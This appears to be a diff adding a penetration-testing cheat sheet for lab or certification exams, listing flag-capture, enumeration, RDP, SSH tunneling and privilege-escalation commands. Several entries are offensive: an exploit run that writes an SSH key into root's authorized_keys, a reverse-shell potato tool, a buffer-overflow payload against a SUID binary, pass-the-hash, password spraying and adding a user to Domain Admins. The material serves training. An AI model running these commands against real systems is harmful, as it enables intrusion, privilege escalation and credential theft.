@@ -1,0 +1,181 @@
+^Misc notes:Always capture both local.txt and proof.txt flags
+^Misc notes:Search for flags recursively from root
+^Misc notes:Use grep for credential hunting in files
+^Misc notes:RDP with drive sharing for easy file transfer
+^Misc notes:Check for SUID binaries and capabilities on Linux
+^Misc notes:Check environment variables for credentials
+^Misc notes:Use tree to visualize directory structure
+^Misc notes:Python TTY upgrade for stable shells
+^Misc notes:SSH tunneling for pivoting
+^Misc notes:Check process command lines for credentials
+^Misc notes:Check bash history for command leakage
+^Misc notes:Always check both CMD and PowerShell environments on Windows
+^Misc notes:Use strings on binaries to find embedded credentials
+^Misc notes:Check for alternate data streams on Windows
+^Misc notes:Use environment variables to find paths and configurations
+
+Flag Capture Linux:find / -name "local.txt" 2>/dev/null # Find local.txt flag file; target-machine
+Flag Capture Linux:find / -name "proof.txt" 2>/dev/null # Find proof.txt flag file; target-machine
+Flag Capture Linux:cat /home/<user>/local.txt # Display local.txt; target-machine
+Flag Capture Linux:cat /root/proof.txt # Display proof.txt; target-machine
+
+Flag Capture Windows:Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue # Find local.txt; target-machine
+Flag Capture Windows:Get-ChildItem -Path C:\ -Recurse -Filter "proof.txt" -ErrorAction SilentlyContinue # Find proof.txt; target-machine
+Flag Capture Windows:where /r C:\ local.txt # Find with where command; target-machine
+Flag Capture Windows:where /r C:\ proof.txt # Find proof.txt; target-machine
+Flag Capture Windows:type C:\Users\<user>\Desktop\local.txt # Display local.txt; target-machine
+Flag Capture Windows:type C:\Users\Administrator\Desktop\proof.txt # Display proof.txt; target-machine
+
+Grep:grep -Ril --exclude-dir=.git 'pass' <filename1> # Search filenames for 'pass' recursively; kali-machine
+Grep:grep -Rin --exclude-dir=.git 'pass' <filename1> # Search with line numbers; kali-machine
+Grep Linux:grep -Ril --exclude-dir=.git -e 'pass' -e 'password' -e 'pwd' <filename1> # Linux keyword search (filenames); target-machine
+Grep Linux:grep -Rin --exclude-dir=.git -e 'pass' -e 'password' -e 'pwd' <filename1> # Linux keyword search with line numbers; target-machine
+
+RDP:xfreerdp3 /u:<user> /p:<password> /v:<target> /dynamic-resolution /compression /network:auto /gfx:AVC420:on +clipboard -themes /bpp:8 -themes -wallpaper /auto-reconnect # Optimized RDP connection; kali-machine
+RDP:xfreerdp3 /v:<target> /u:'<user>' /p:'<password>' /cert:ignore /dynamic-resolution /drive:share,/home/kali +clipboard # RDP with drive sharing; kali-machine
+RDP:xfreerdp3 /u:<user> /p:<password> /v:<target> /drive:share,/home/kali # Simple RDP with drive share; kali-machine
+RDP:xfreerdp3 /v:<target> /u:<user> /p:'<password>' /sec:nla /cert:ignore #connect to target via RDP using Network Level Authentication and ignore certificate warnings; kali-machine
+
+Misc Tools:./49067.py --ahost <target> --cmd 'echo MYPUBKEY > /root/.ssh/authorized_keys' # Run 49067 exploit; kali-machine
+Misc Tools:./49067.py --ahost <target> --pythonshell --lhost=<target> --lport=8000 # Get Python shell; kali-machine
+Misc Tools:./compile.sh # Run compile script; kali-machine
+Misc Tools:./cups-root-file-read.sh # Run cups file read exploit; kali-machine
+Misc Tools:./exploit-2 /usr/bin/sudo # Run exploit-2 against sudo; kali-machine
+Misc Tools:./getenv SHELLCODE /usr/sbin/readfile # Run getenv; kali-machine
+Misc Tools:./kerbrute_linux_amd64 userenum -d dante --dc <target> users.txt # Kerbrute user enum; kali-machine
+Misc Tools:./linux-exploit-suggester-2.pl -k 2.6.32 # Run suggester for kernel 2.6.32; kali-machine
+Misc Tools:./proxy -selfcert # Run proxy with self-cert; kali-machine
+Misc Tools:./shell.exe # Run shell executable; kali-machine
+Misc Tools:./SigmaPotato.exe --revshell lhost lport # Run SigmaPotato; kali-machine
+Misc Tools:./configuration.php:36: public $mailfrom = 'chloe@challenge.lab'; # Example config line; kali-machine
+Misc Tools:./cron/ # Cron directory; kali-machine
+Misc Tools:./cron/cron.conf # Cron config file; kali-machine
+Misc Tools:./db/ # Database directory; kali-machine
+Misc Tools:./dns/ # DNS directory; kali-machine
+Misc Tools:./mail/ # Mail directory; kali-machine
+Misc Tools:./pam/ # PAM directory; kali-machine
+Misc Tools:./pam/group # PAM group file; kali-machine
+Misc Tools:./pam/passwd # PAM passwd file; kali-machine
+Misc Tools:./pam/shadow # PAM shadow file; kali-machine
+Misc Tools:./user_dir/ # User directory; kali-machine
+Misc Tools:./user_dir/.bash_logout.tar.gz # User bash_logout backup; kali-machine
+Misc Tools:./user_dir/.bashrc.tar.gz # User bashrc backup; kali-machine
+Misc Tools:./user_dir/.profile.tar.gz # User profile backup; kali-machine
+Misc Tools:./user_dir/local.txt.tar.gz # local.txt backup; kali-machine
+Misc Tools:./user_dir/tmp.tar.gz # tmp backup; kali-machine
+Misc Tools:./vesta/ # VestaCP directory; kali-machine
+Misc Tools:./vesta/history.log # Vesta history log; kali-machine
+Misc Tools:./vesta/ssl/ # Vesta SSL directory; kali-machine
+Misc Tools:./vesta/stats.log # Vesta stats log; kali-machine
+Misc Tools:./vesta/user.conf # Vesta user config; kali-machine
+Misc Tools:./web/ # Web directory; kali-machine
+
+SUID Binaries:/bin/bash # bash binary; kali-machine
+SUID Binaries:/usr/bin/arping = cap_net_raw+ep # arping with capabilities; kali-machine
+SUID Binaries:/usr/bin/at # at binary; kali-machine
+SUID Binaries:/usr/bin/authbind # authbind binary; kali-machine
+SUID Binaries:/usr/bin/base64 # base64 binary; kali-machine
+SUID Binaries:/usr/bin/bash # bash binary; kali-machine
+SUID Binaries:/usr/bin/chfn # chfn binary; kali-machine
+SUID Binaries:/usr/bin/chsh # chsh binary; kali-machine
+SUID Binaries:/usr/bin/crontab # crontab binary; kali-machine
+SUID Binaries:/usr/bin/curl # curl binary; kali-machine
+SUID Binaries:/usr/bin/fusermount # fusermount binary; kali-machine
+SUID Binaries:/usr/bin/g++ # g++ binary; kali-machine
+SUID Binaries:/usr/bin/gcc # gcc binary; kali-machine
+SUID Binaries:/usr/bin/gpasswd # gpasswd binary; kali-machine
+SUID Binaries:/usr/bin/gpg # gpg binary; kali-machine
+SUID Binaries:/usr/bin/make # make binary; kali-machine
+SUID Binaries:/usr/bin/mount # mount binary; kali-machine
+SUID Binaries:/usr/bin/mtr-packet = cap_net_raw+ep # mtr with caps; kali-machine
+SUID Binaries:/usr/bin/nc # nc binary; kali-machine
+SUID Binaries:/usr/bin/newgrp # newgrp binary; kali-machine
+SUID Binaries:/usr/bin/passwd # passwd binary; kali-machine
+SUID Binaries:/usr/bin/perl # perl binary; kali-machine
+SUID Binaries:/usr/bin/ping # ping binary; kali-machine
+SUID Binaries:/usr/bin/ping = cap_net_raw+ep # ping with capabilities; kali-machine
+SUID Binaries:/usr/bin/python3 # python3 binary; kali-machine
+SUID Binaries:/usr/bin/snap # snap binary; kali-machine
+SUID Binaries:/usr/bin/socat # socat binary; kali-machine
+SUID Binaries:/usr/bin/su # su binary; kali-machine
+SUID Binaries:/usr/bin/sudo # sudo binary; kali-machine
+SUID Binaries:/usr/bin/traceroute6.iputils = cap_net_raw+ep # traceroute with caps; kali-machine
+SUID Binaries:/usr/bin/umount # umount binary; kali-machine
+SUID Binaries:/usr/bin/wget # wget binary; kali-machine
+SUID Binaries:/usr/sbin/readfile $(python2 -c 'print "A"*88+"\x52\xe7\xff\xff\xff\x7f"') # Exploit readfile; kali-machine
+SUID Binaries:/usr/sbin/readfile . # Run readfile on current dir; kali-machine
+
+Bash:bash # Start bash; kali-machine
+Bash:bash /tmp/linenum.sh # Run linenum script; kali-machine
+Bash:bash poc.sh # Run POC script; kali-machine
+
+Chmod:chmod +x exploit.sh # Make script executable; kali-machine
+Chmod:chmod +x getenv # Make getenv executable; kali-machine
+Chmod:chmod 4755 bash # Set SUID on bash; kali-machine
+Chmod:chmod u+x cups-root-file-read.sh # Make cups script executable; kali-machine
+Chmod Linux:chmod +x <filename1> # Make file executable; target-machine
+
+CMD:cmd # Start command prompt; kali-machine
+CMD:cmd.exe /c 'sc qc KiteService' # Query service config; kali-machine
+CMD Windows:cmd.exe /c "sc qc <ServiceName>" # Query Windows service; target-machine
+
+Evil-WinRM:evil-winrm # Start Evil-WinRM; kali-machine
+Evil-WinRM:evil-winrm -i <target> -u administrator -H '<ntlm>' # Connect as admin with NTLM; kali-machine
+Evil-WinRM:evil-winrm -i <target> -u <user> -p <password> # Connect with password; kali-machine
+
+FTP:ftp <target> # FTP client connection; kali-machine
+FTP:ftp <target> <port> # FTP to specific port; kali-machine
+
+IPConfig Windows:ipconfig /all # Full network config including DNS/DHCP; target-machine
+
+Net:net use \\<target>\share /user:<user> <password> # Map SMB share; target-machine
+Net:net use <drive>: /delete # Remove mapped drive; target-machine
+Net:net group "Domain Admins" <user> /add /domain # Add user to Domain Admins; target-machine
+
+NXC:nxc smb <target> -u <user> -p <password> # Basic nxc SMB auth test; kali-machine
+NXC:nxc winrm <target> -u <user> -p <wordlist1> # WinRM password spray; kali-machine
+
+PowerShell Command Discovery:Get-Command sc # Check what "sc" resolves to; target-machine
+
+Environment Variables Linux:env # List all environment variables; target-machine
+Environment Variables Linux:printenv # Print all environment variables; target-machine
+Environment Variables Linux:echo $PATH # Display PATH variable; target-machine
+Environment Variables CMD:set # List all environment variables; target-machine
+Environment Variables CMD:echo %PATH% # Display PATH; target-machine
+Environment Variables PowerShell:Get-ChildItem Env: # List all environment variables; target-machine
+Environment Variables PowerShell:echo $env:PATH # Display PATH; target-machine
+
+Python TTY:python3 -c 'import pty;pty.spawn("/bin/bash")' # Upgrade shell to interactive TTY; target-machine
+Python Web Server:python3 -m http.server <kaliPort> # Quick HTTP server; kali-machine
+
+SSH:ssh <user>@<target> # SSH login; kali-machine
+SSH Key:ssh -i <filename1> <user>@<target> # SSH with private key; kali-machine
+SSH Port Forward:ssh -L <kaliPort>:127.0.0.1:<port> <user>@<target> # Forward remote port to local; kali-machine
+SSH Dynamic SOCKS:ssh -D <kaliPort> -C -q -N <user>@<target> # SOCKS proxy via SSH; kali-machine
+
+Linux User Context:id # Current user + groups; target-machine
+Linux Host Info:uname -a # Kernel/arch info; target-machine
+Linux Processes:ps aux # Running processes; target-machine
+Linux Listening Ports:ss -tulnp # List listening ports; target-machine
+Linux File Perms:ls -la # List all files including hidden; target-machine
+
+Windows User Context:whoami /all # Groups + privileges; target-machine
+Windows System Info:systeminfo # OS/patch/hardware summary; target-machine
+
+Port Scan PowerShell:Test-NetConnection -ComputerName <target> -Port <port> # Test TCP port connectivity; target-machine
+
+Strings:strings -e l <file.exe> # Extract little-endian Unicode strings; kali-machine
+Strings:strings -n 5 <file.exe> # Extract ASCII strings with minimum length 5; kali-machine
+
+Shell Context Linux:echo $0 # Display current shell name; target-machine
+Shell Context Windows:echo %COMSPEC% # Display default command interpreter; target-machine
+
+Directory Tree Windows:tree /a /f # Display full directory tree with ASCII; target-machine
+Directory Tree Linux:tree -a -f # Display full directory tree with paths; target-machine
+
+Kill Process:sudo kill -9 <PID> # Force terminate process; kali-machine
+Restart vmtoolsd:sudo systemctl restart vmtoolsd # Restart VMware tools; kali-machine
+Reboot:sudo reboot # Reboot system; kali-machine
+
+Hosts File:echo "<targetIP> <vhost.domain>" | sudo tee -a /etc/hosts # manually map vhost to target IP for web access; kali-machine
+Packet Capture:tcpdump -i tun0 icmp #capture ICMP traffic on the tun0 interface (useful for verifying ping callbacks or network reachability during exploitation); kali-machine
